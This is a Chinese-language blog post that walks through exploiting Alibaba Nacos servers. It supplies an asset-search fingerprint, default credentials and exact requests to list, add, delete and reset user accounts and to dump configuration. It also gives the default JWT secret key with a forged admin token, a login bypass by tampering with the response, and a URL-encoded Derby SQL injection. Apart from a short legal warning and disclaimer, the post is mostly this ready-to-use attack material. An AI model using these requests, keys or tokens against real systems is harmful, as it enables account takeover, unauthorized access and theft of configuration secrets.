#  Nacos 漏洞利用姿势大全-附批量工具   
原创 丁永博  丁永博的成长日记   2024-04-17 23:59  
  
Alibaba Nacos是阿里巴巴推出来的一个新开源项目，是一个更易于构建云原生应用的动态服务发现、配置管理和服务管理平台。致力于帮助发现、配置和管理微服务。Nacos提供了一组简单易用的特性集，可以快速实现动态服务发现、服务配置、服务元数据及流量管理。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/vfnOYb9lyqqUWYYBR1NDeR9wD0uVHuPECoLvgoqpPxr96SHS9NmyBOFmefaExM8qo4AtUXIXXJI4kwdXKI8ibuA/640?wx_fmt=png&from=appmsg "")  
  
**指纹：app="nacos"**  
  
**默认密码nacos nacos就不说了**  
## 漏洞1获取已有的用户列表的账号和密码  
  
在路径后面加上/nacos/v1/auth/users?pageNo=1&pageSize=9可以获取到已有的用户名和密码，  
可以  
把User-Agent头改为Nacos-Server  
，如图  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/vfnOYb9lyqqUWYYBR1NDeR9wD0uVHuPEZfR8GtQwkWN2O3mSVpmJYzU29Hksd49sjqVmbD3z0bfiaNWrUElWulQ/640?wx_fmt=png&from=appmsg "")  
## 漏洞2任意用户添加  
  
更改提交方式为POST , 访问/nacos/v1/auth/users?username=test111&password=123456  
  
新建一个账号test111,可以看到创建用户成功，如图  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/vfnOYb9lyqqUWYYBR1NDeR9wD0uVHuPEKcQwuAnicXAg7KA1dGhHYADgp7kw3WMRSc6PZj2dURDo4GQdu0PNW3A/640?wx_fmt=png&from=appmsg "")  
  
使用该账号可以发现登录成功，如图  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/vfnOYb9lyqqUWYYBR1NDeR9wD0uVHuPE5qxiaA9TqOibpic2tAtWnIAbnQgsOA783vNwb7xTso6zoOBwl6tcL3iaog/640?wx_fmt=png&from=appmsg "")  
## 漏洞3任意用户删除  
  
更改提交方式为DELETE , 访问DELETE /nacos/v1/auth/users?username=test111  
  
可以看到用户删除成功，如图  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/vfnOYb9lyqqUWYYBR1NDeR9wD0uVHuPEVYLtEKcBjQ0LvibYfibjA1rYnMs40RLpMNJPu232NheaCK1icXXj3Yj4g/640?wx_fmt=png&from=appmsg "")  
## 漏洞4用户密码重置  
  
更改提交方式为PUT,访问 /nacos/v1/auth/users?accessToken=&username=test1&newPassword=test222  
  
可以看到用户密码更新成功，如图  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/vfnOYb9lyqqUWYYBR1NDeR9wD0uVHuPEYSSF9LzKXPlc5M6RnKbscib3D7zfeULGNWf0aUI7zlZibhEP32Q7JzjQ/640?wx_fmt=png&from=appmsg "")  
## 漏洞5配置信息泄露  
  
在路径后面加上：/nacos/v1/cs/configs?search=accurate&dataId=&group=&pageNo=1&pageSize=99  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/vfnOYb9lyqqUWYYBR1NDeR9wD0uVHuPEn0BLLFibUKK6ptwkiagZzkdPLVXEfvC4bVmm1rjWpXdJhcWu8Bhb3kvQ/640?wx_fmt=png&from=appmsg "")  
## 漏洞6  token.secret.key默认配置(QVD-2023-6271)  
```
SecretKey012345678901234567890123456789012345678901234567890123456789
```  
```
https://jwt.io/
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/vfnOYb9lyqqUWYYBR1NDeR9wD0uVHuPEo4Xsw5dyr4J1ggdVPBLqJRJGGxRzFibQpP8aj7zltdgGVJVAKH2KL9A/640?wx_fmt=png&from=appmsg "")  
```
http://shijianchuo.wiicha.com/
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/vfnOYb9lyqqUWYYBR1NDeR9wD0uVHuPEvLQXoTpkrrNZoRspagnXEkBeOmpHjk3oib88dUQ9gIuPx7LcKicT4XqQ/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/vfnOYb9lyqqUWYYBR1NDeR9wD0uVHuPEcicaNic5t9zeXaMW7AqjItQXeoqribjiavIwa7GOr7d3brTAVrbJW9tbXg/640?wx_fmt=png&from=appmsg "")  
  
在登录请求中，拦截数据包，添加Authorization信息，拦截放回包后放包  
```
Authorization: Bearer 你的token
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/vfnOYb9lyqqUWYYBR1NDeR9wD0uVHuPEgC75IJSG6IauzLsP3665kmJlpbZUBB3QmlibqFz9QojicZDvI8xaErIg/640?wx_fmt=png&from=appmsg "")  
  
**利用方式2：**  
  
登陆界面输入任意账户密码 ，点击登录。更改改返回包状态码跟body  
  
![](https://mmbiz.qpic.cn/mmbiz_png/vfnOYb9lyqpTI99D9icvYqGMRXSK3CRKCibuiauv59NKB1DEzpyBZM2t9ibHWic4gTzBLYfRURQN6U1HDMib0zFlMzcw/640?wx_fmt=other&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
```
{
"accessToken":
"eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6MTY3NTA4Mzg3N30.mIjNX6MXNF3FgQNTl-FduWpsaTSZrOQZxTCu7Tg46ZU","tokenTtl": 18000,
"globalAdmin": true,"username":"nacos"
}
```  
##   
## 漏洞7 Nacos Derby SQL注入漏洞  (CNVD-2020-67618)  
```
/nacos/v1/cs/ops/derby?sql=%73%65%6c%65%63%74%20%2a%20%66%72%6f%6d%20%75%73%65%72%73
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/vfnOYb9lyqqUWYYBR1NDeR9wD0uVHuPEDkUTlHpSetxHdgLQ6nNrW3D2HbRCbFdjztggSYQXmSFMT5dULKoBMg/640?wx_fmt=png&from=appmsg "")  
  
**批量工具放知识星球**  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/vfnOYb9lyqqUWYYBR1NDeR9wD0uVHuPEIfXCa1CxVEN0IPCgE1JyIbgplkWDKdoJU8N4evub4xcP0ardsBUcNQ/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/vfnOYb9lyqqUWYYBR1NDeR9wD0uVHuPEbfLdtBfEmh2ST33Hl1OLkOAH2693FddgZuvkWc00GdWk0fwsJAS3uA/640?wx_fmt=jpeg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Gn0JbCnxttRbj4Mib3fcSfwr0tP4UxXtjf47HFwaZcgwWStzGNLNMlGKQJz902fHTT8PCfOwHedLqarXh0eC9KQ/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
小知识  
  
  
  
**依据《刑法》第285条第3款的规定，犯提供非法侵入或者控制计算机信息系统罪的，处3年以下有期徒刑或者****拘役****，并处或者单处****罚金****;情节特别严重的，处3年以上7年以下有期徒刑，并处罚金。**  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Gn0JbCnxttRbj4Mib3fcSfwr0tP4UxXtjf47HFwaZcgwWStzGNLNMlGKQJz902fHTT8PCfOwHedLqarXh0eC9KQ/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
声明  
  
  
  
**本文提供的技术参数仅供学习或运维人员对内部系统进行测试提供参考，未经授权请勿用本文提供的技术进行破坏性测试，利用此文提供的信息造成的直接或间接损失，由使用者承担。**  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/vfnOYb9lyqr922u4gKibKgUuPUMicLibMqiajkAJp8vG8WLtiav9gmSF7T453KlPULqXgXJFaiat5gqogqncOXrghYPA/640?wx_fmt=gif&wxfrom=5&wx_lazy=1&tp=webp "")  
  
  
欢迎   
**在看**  
丨  
**留言**  
丨  
**分享至朋友圈**  
 三连  
  
 **好文推荐******  
  
- [实战|UEditor编辑器任意文件上传漏洞）](http://mp.weixin.qq.com/s?__biz=MzkyOTMxNDM3Ng==&mid=2247486237&idx=1&sn=b50d56f30d735289bb60a10632b98ab9&chksm=c20a283af57da12caaaaeb4452adc713c0404756a814305eccece911312100de4ef3a5d6909b&scene=21#wechat_redirect)  
  
  
- [实战|监控里的秘密](http://mp.weixin.qq.com/s?__biz=MzkyOTMxNDM3Ng==&mid=2247484122&idx=1&sn=88801391b60d3b77df97026e9e495ec2&chksm=c20a21fdf57da8eb9641bff94074f2aa736d12e3a48098d33e66aca17ded9267e6686ddb9452&scene=21#wechat_redirect)  
  
  
- [木马工具|控制别人的电脑，非常简单！](http://mp.weixin.qq.com/s?__biz=MzkyOTMxNDM3Ng==&mid=2247484445&idx=1&sn=bb60b1a6a69c8c2d31a6e8d5fb09a638&chksm=c20a273af57dae2c544388af5d942e9100225f400d055274123dcd13784c21ec598b4f2e7591&scene=21#wechat_redirect)  
  
  
- [BlueLotus联动DVWA，实现xss窃取cookie](http://mp.weixin.qq.com/s?__biz=MzkyOTMxNDM3Ng==&mid=2247486084&idx=1&sn=62d3d7448aa06365d15157326e59b8e7&chksm=c20a29a3f57da0b56f4e5323d7c6b05e91b597df2697934e7903c27a730e2f4443983216f289&scene=21#wechat_redirect)  
  
  
- [实战|逻辑漏洞绕过](http://mp.weixin.qq.com/s?__biz=MzAwMjA5OTY5Ng==&mid=2247509911&idx=1&sn=c37f416483c1ab4bc7b8ee13a379280a&chksm=9acd7708adbafe1ef9f9f030e9de25446eacec18bd15df2f76ba21a4031c7f827563c03bb907&scene=21#wechat_redirect)  
  
  
- [路边的u盘你不要捡，山下的女人是老虎~](http://mp.weixin.qq.com/s?__biz=MzkyOTMxNDM3Ng==&mid=2247485822&idx=1&sn=a5e05071dccc53fecc4b69d513489444&chksm=c20a2a59f57da34f00a26cab87251fffb1ca7ca51c658fea0d5e7f08788c1d59d86f95fc137a&scene=21#wechat_redirect)  
  
  
- [永恒之蓝彩虹猫联动](http://mp.weixin.qq.com/s?__biz=MzkyOTMxNDM3Ng==&mid=2247485315&idx=1&sn=c64f1d550507b15b7655a6ec18e857de&chksm=c20a24a4f57dadb219c1ef76e18fad92932596782d9d7c10f264cb23245af31d5624666de16f&scene=21#wechat_redirect)  
  
  
- [5min学渗透|wifi断网攻击、暴力攻击](http://mp.weixin.qq.com/s?__biz=MzkyOTMxNDM3Ng==&mid=2247485194&idx=1&sn=c425ac374dde652c5ac820b8b7aa5fdd&chksm=c20a242df57dad3b2fe01e302955f3ad3f25cde0ab8e08bb21a431c24f3acad965472efcdbed&scene=21#wechat_redirect)  
  
  
- [5min学渗透|你的手机是如何被监控的?](http://mp.weixin.qq.com/s?__biz=MzkyOTMxNDM3Ng==&mid=2247485149&idx=1&sn=242ab51f1c6797cdff86af09a6ef6a1d&chksm=c20a25faf57dacec21276c8509c453a4c8446fdf44494ec2663ca61aab494ca7edc1eedc8694&scene=21#wechat_redirect)  
  
  
- [5min学渗透|简单制作钓鱼wifi 01](http://mp.weixin.qq.com/s?__biz=MzkyOTMxNDM3Ng==&mid=2247485124&idx=1&sn=21899d53b348d7daa9e73b464fb9d423&chksm=c20a25e3f57dacf54e101b31ae6b292f822fc012795b604df0f15231072e80d887e8d98090bf&scene=21#wechat_redirect)  
  
  
- [实用小工具|破解office三件套加密密码](http://mp.weixin.qq.com/s?__biz=MzkyOTMxNDM3Ng==&mid=2247485123&idx=1&sn=21bc7ca9cc48d0270667709dc448410f&chksm=c20a25e4f57dacf27d5fb2d90f1ac6c04ac36ca5549023c4d83c85ff5464632563bad975cd50&scene=21#wechat_redirect)  
  
  
  
  
